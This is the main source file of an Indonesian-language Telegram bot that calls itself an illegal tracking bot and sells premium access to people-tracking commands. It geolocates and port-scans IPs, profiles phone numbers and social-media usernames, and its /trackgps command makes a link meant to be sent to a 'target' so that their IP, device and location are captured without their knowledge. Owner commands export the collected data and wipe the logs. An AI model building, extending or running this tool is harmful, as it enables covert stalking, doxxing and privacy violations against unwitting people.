require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const crypto = require('crypto');
const db = require('./database');
const ipTracker = require('./modules/ip-tracker');
const phoneTracker = require('./modules/phone-tracker');
const domainTracker = require('./modules/domain-tracker');
const sosmedTracker = require('./modules/sosmed-tracker');
const locationTracker = require('./modules/location-tracker');
const deviceTracker = require('./modules/device-tracker');

const tokenData = JSON.parse(fs.readFileSync('token.json', 'utf8'));
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Database init
db.init();

// Log function
function log(userId, username, command, target, status) {
    const logEntry = `[${new Date().toISOString()}] [USER_${userId}] [${command}] [${target}] ${status}\n`;
    fs.appendFileSync('logs/tracking.log', logEntry);
    db.saveLog(userId, username, command, target, status);
}

// Check premium
function isPremium(userId) {
    return db.isPremium(userId);
}

// Check daily limit
function getDailyLimit(userId) {
    if (isPremium(userId)) return Infinity;
    const today = new Date().toISOString().split('T')[0];
    const count = db.getTodayUsage(userId, today);
    return 3 - count;
}

// Start command
bot.onText(/\/start/, (msg) => {
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    const premium = isPremium(userId);
    const limit = getDailyLimit(userId);
    
    let statusText = premium ? '✅ PREMIUM' : '❌ FREE';
    let limitText = premium ? '♾️ Unlimited' : `${limit} tersisa`;
    
    const menu = `💀 TRACKING BOT ILEGAL
━━━━━━━━━━━━━━━━━━━━━
👤 User: @${username}
🆔 ID: ${userId}
💎 Status: ${statusText}
📊 Sisa Tracking Hari Ini: ${limitText}

📋 COMMANDS:
/trackip [IP] - Lacak IP + scan port
/trackphone [nomor] - Lacak nomor HP
/trackdomain [domain] - Lacak domain
/tracksosmed [username] - Lacak sosial media
/trackgps - Generate link tracking GPS
/gpsdata [id] - Lihat hasil tracking GPS
/deviceinfo [useragent] - Cek device info
/livelocation [ip] - Tracking live location
/status - Cek status akun
/help - Bantuan command`;

    bot.sendMessage(msg.chat.id, menu);
});

// Track IP
bot.onText(/\/trackip (.+)/, async (msg, match) => {
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    const target = match[1].trim();
    
    if (!isPremium(userId) && getDailyLimit(userId) <= 0) {
        return bot.sendMessage(msg.chat.id, '❌ Limit tracking hari ini habis! Upgrade ke premium untuk unlimited.');
    }
    
    try {
        const result = await ipTracker.track(target);
        log(userId, username, '/trackip', target, 'SUCCESS');
        db.incrementUsage(userId);
        
        const response = `📍 IP TRACKING RESULT
━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${result.ip}
📍 Lokasi: ${result.city}, ${result.region}, ${result.country}
🗺️ Koordinat: ${result.lat}, ${result.lon}
🏢 ISP: ${result.isp}
⏰ Timezone: ${result.timezone}
🔢 ASN: ${result.asn}
🏷️ Org: ${result.org}

🔌 PORT SCAN:
${result.ports.map(p => `  • ${p.port}: ${p.status}`).join('\n')}

🔄 Reverse DNS: ${result.reverseDns || 'Tidak ditemukan'}
🛡️ Abuse: ${result.abuse ? '⚠️ Terdaftar di database abuse' : '✅ Bersih'}
🔒 Proxy/VPN/TOR: ${result.proxy ? '⚠️ Terdeteksi' : '✅ Tidak terdeteksi'}

🗺️ Google Maps: ${result.mapsLink}`;
        
        bot.sendMessage(msg.chat.id, response);
    } catch (error) {
        log(userId, username, '/trackip', target, 'ERROR');
        bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
    }
});

// Track Phone
bot.onText(/\/trackphone (.+)/, async (msg, match) => {
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    const target = match[1].trim();
    
    if (!isPremium(userId) && getDailyLimit(userId) <= 0) {
        return bot.sendMessage(msg.chat.id, '❌ Limit tracking hari ini habis! Upgrade ke premium untuk unlimited.');
    }
    
    try {
        const result = await phoneTracker.track(target);
        log(userId, username, '/trackphone', target, 'SUCCESS');
        db.incrementUsage(userId);
        
        const response = `📱 PHONE TRACKING RESULT
━━━━━━━━━━━━━━━━━━━━━
📞 Nomor: ${result.number}
🌍 Format Internasional: ${result.international}
📡 Provider: ${result.provider}
📍 Lokasi: ${result.location}

✅ WhatsApp: ${result.whatsapp ? 'Terdaftar' : 'Tidak terdaftar'}
✅ Telegram: ${result.telegram ? 'Terdaftar' : 'Tidak terdaftar'}
✅ Signal: ${result.signal ? 'Terdaftar' : 'Tidak terdaftar'}
✅ Line: ${result.line ? 'Terdaftar' : 'Tidak terdaftar'}

🕒 Last Seen: ${result.lastSeen || 'Tidak diketahui'}`;
        
        bot.sendMessage(msg.chat.id, response);
    } catch (error) {
        log(userId, username, '/trackphone', target, 'ERROR');
        bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
    }
});

// Track Domain
bot.onText(/\/trackdomain (.+)/, async (msg, match) => {
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    const target = match[1].trim();
    
    if (!isPremium(userId)) {
        return bot.sendMessage(msg.chat.id, '❌ Fitur ini khusus premium!');
    }
    
    try {
        const result = await domainTracker.track(target);
        log(userId, username, '/trackdomain', target, 'SUCCESS');
        
        const response = `🌐 DOMAIN TRACKING RESULT
━━━━━━━━━━━━━━━━━━━━━
🔗 Domain: ${result.domain}
🖥️ IP Server: ${result.ip}

📋 DNS Records:
${result.dns.map(d => `  • ${d.type}: ${d.value}`).join('\n')}

📜 WHOIS:
  • Registrar: ${result.whois.registrar}
  • Created: ${result.whois.created}
  • Expired: ${result.whois.expired}
  • Name: ${result.whois.name}
  • Email: ${result.whois.email}

🔒 SSL Certificate:
  • Issuer: ${result.ssl.issuer}
  • Valid From: ${result.ssl.validFrom}
  • Valid To: ${result.ssl.validTo}

🛠️ Server: ${result.server}
⚠️ Blacklist: ${result.blacklist ? '❌ Terdaftar di blacklist' : '✅ Bersih'}`;
        
        bot.sendMessage(msg.chat.id, response);
    } catch (error) {
        log(userId, username, '/trackdomain', target, 'ERROR');
        bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
    }
});

// Track Sosmed
bot.onText(/\/tracksosmed (.+)/, async (msg, match) => {
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    const target = match[1].trim();
    
    if (!isPremium(userId)) {
        return bot.sendMessage(msg.chat.id, '❌ Fitur ini khusus premium!');
    }
    
    try {
        const result = await sosmedTracker.track(target);
        log(userId, username, '/tracksosmed', target, 'SUCCESS');
        
        const response = `📱 SOSMED TRACKING RESULT
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${target}

${result.platforms.map(p => `  • ${p.name}: ${p.found ? '✅ Ditemukan' : '❌ Tidak ditemukan'}${p.profilePic ? ` [Foto Profil: ${p.profilePic}]` : ''}`).join('\n')}`;
        
        bot.sendMessage(msg.chat.id, response);
    } catch (error) {
        log(userId, username, '/tracksosmed', target, 'ERROR');
        bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
    }
});

// Track GPS
bot.onText(/\/trackgps/, (msg) => {
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    
    if (!isPremium(userId)) {
        return bot.sendMessage(msg.chat.id, '❌ Fitur ini khusus premium!');
    }
    
    const id = crypto.randomBytes(8).toString('hex');
    const link = `https://ip-tracker.com/${id}`;
    
    db.saveGPS(id);
    
    const response = `📍 GPS TRACKING LINK
━━━━━━━━━━━━━━━━━━━━━
🔗 Link: ${link}
🆔 ID: ${id}

📌 Kirim link ini ke target. Saat target membuka link, semua data akan tercapture.

Gunakan:
/gpsdata ${id} - Lihat hasil tracking
/gpslist - Lihat semua data (owner only)`;
    
    bot.sendMessage(msg.chat.id, response);
    log(userId, username, '/trackgps', id, 'SUCCESS');
});

// GPS Data
bot.onText(/\/gpsdata (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const id = match[1].trim();
    
    const data = db.getGPSData(id);
    if (!data) {
        return bot.sendMessage(msg.chat.id, '❌ Data tidak ditemukan atau belum ada yang membuka link.');
    }
    
    const response = `📍 GPS DATA RESULT
━━━━━━━━━━━━━━━━━━━━━
🆔 ID: ${data.id}
🌐 IP: ${data.ip}
📱 Device: ${data.device}
🖥️ OS: ${data.os}
🌍 Browser: ${data.browser}
📐 Screen: ${data.screen}
🌎 Language: ${data.language}
📍 Location: ${data.location}
🕒 Timestamp: ${data.timestamp}`;
    
    bot.sendMessage(msg.chat.id, response);
});

// GPS List (Owner only)
bot.onText(/\/gpslist/, (msg) => {
    const userId = msg.from.id;
    
    if (userId.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya owner.');
    }
    
    const data = db.getAllGPS();
    if (data.length === 0) {
        return bot.sendMessage(msg.chat.id, '📭 Belum ada data GPS.');
    }
    
    const response = `📋 GPS DATA LIST
━━━━━━━━━━━━━━━━━━━━━
${data.map(d => `  • ${d.id}: ${d.ip} - ${d.device} (${d.timestamp})`).join('\n')}`;
    
    bot.sendMessage(msg.chat.id, response);
});

// GPS Delete (Owner only)
bot.onText(/\/gpsdelete (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const id = match[1].trim();
    
    if (userId.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya owner.');
    }
    
    db.deleteGPS(id);
    bot.sendMessage(msg.chat.id, `✅ Data GPS ${id} berhasil dihapus.`);
});

// Device Info
bot.onText(/\/deviceinfo (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const useragent = match[1].trim();
    
    const result = deviceTracker.parse(useragent);
    
    const response = `📱 DEVICE INFO RESULT
━━━━━━━━━━━━━━━━━━━━━
🖥️ OS: ${result.os}
🌐 Browser: ${result.browser}
📱 Type: ${result.type}
📐 Device: ${result.device}
🔄 Version: ${result.version}`;
    
    bot.sendMessage(msg.chat.id, response);
});

// Live Location
bot.onText(/\/livelocation (.+)/, async (msg, match) => {
    const userId = msg.from.id;
    const target = match[1].trim();
    
    if (!isPremium(userId)) {
        return bot.sendMessage(msg.chat.id, '❌ Fitur ini khusus premium!');
    }
    
    try {
        const result = await locationTracker.trackLive(target);
        const response = `📍 LIVE LOCATION TRACKING
━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${result.ip}
📍 Kota: ${result.city}
🌍 Negara: ${result.country}
🗺️ Koordinat: ${result.lat}, ${result.lon}
🕒 Last Update: ${result.lastUpdate}

📌 Update otomatis setiap 5 menit.
🗺️ Maps: https://www.google.com/maps?q=${result.lat},${result.lon}`;
        
        bot.sendMessage(msg.chat.id, response);
    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
    }
});

// Status
bot.onText(/\/status/, (msg) => {
    const userId = msg.from.id;
    const premium = isPremium(userId);
    const limit = getDailyLimit(userId);
    
    const response = `📊 STATUS AKUN
━━━━━━━━━━━━━━━━━━━━━
👤 User ID: ${userId}
💎 Status: ${premium ? '✅ PREMIUM' : '❌ FREE'}
📊 Sisa Tracking: ${premium ? '♾️ Unlimited' : limit}
📋 Fitur Premium: ${premium ? '✅ Semua fitur aktif' : '❌ IP & Phone only'}`;
    
    bot.sendMessage(msg.chat.id, response);
});

// Help
bot.onText(/\/help/, (msg) => {
    const response = `📋 BANTUAN COMMAND
━━━━━━━━━━━━━━━━━━━━━
/trackip [IP] - Lacak IP + scan port
/trackphone [nomor] - Lacak nomor HP
/trackdomain [domain] - Lacak domain
/tracksosmed [username] - Lacak sosial media
/trackgps - Generate link tracking GPS
/gpsdata [id] - Lihat hasil tracking GPS
/deviceinfo [useragent] - Cek device info
/livelocation [ip] - Tracking live location
/status - Cek status akun
/help - Bantuan command

🔐 Owner Commands:
/addprem [user_id] - Tambah premium
/delprem [user_id] - Hapus premium
/gpslist - Lihat semua data GPS
/gpsdelete [id] - Hapus data GPS
/export - Export semua data
/clearlogs - Hapus semua log`;
    
    bot.sendMessage(msg.chat.id, response);
});

// Add Premium (Owner only)
bot.onText(/\/addprem (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const targetId = match[1].trim();
    
    if (userId.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya owner.');
    }
    
    db.addPremium(targetId, userId.toString());
    bot.sendMessage(msg.chat.id, `✅ User ${targetId} sekarang premium.`);
});

// Del Premium (Owner only)
bot.onText(/\/delprem (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const targetId = match[1].trim();
    
    if (userId.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya owner.');
    }
    
    db.removePremium(targetId);
    bot.sendMessage(msg.chat.id, `✅ User ${targetId} tidak lagi premium.`);
});

// Export (Owner only)
bot.onText(/\/export/, (msg) => {
    const userId = msg.from.id;
    
    if (userId.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya owner.');
    }
    
    const data = db.exportAll();
    const file = 'export_data.json';
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    bot.sendDocument(msg.chat.id, file);
});

// Clear Logs (Owner only)
bot.onText(/\/clearlogs/, (msg) => {
    const userId = msg.from.id;
    
    if (userId.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya owner.');
    }
    
    db.clearLogs();
    fs.writeFileSync('logs/tracking.log', '');
    bot.sendMessage(msg.chat.id, '✅ Semua log berhasil dibersihkan.');
});

console.log('🔥 Tracking Bot started...');
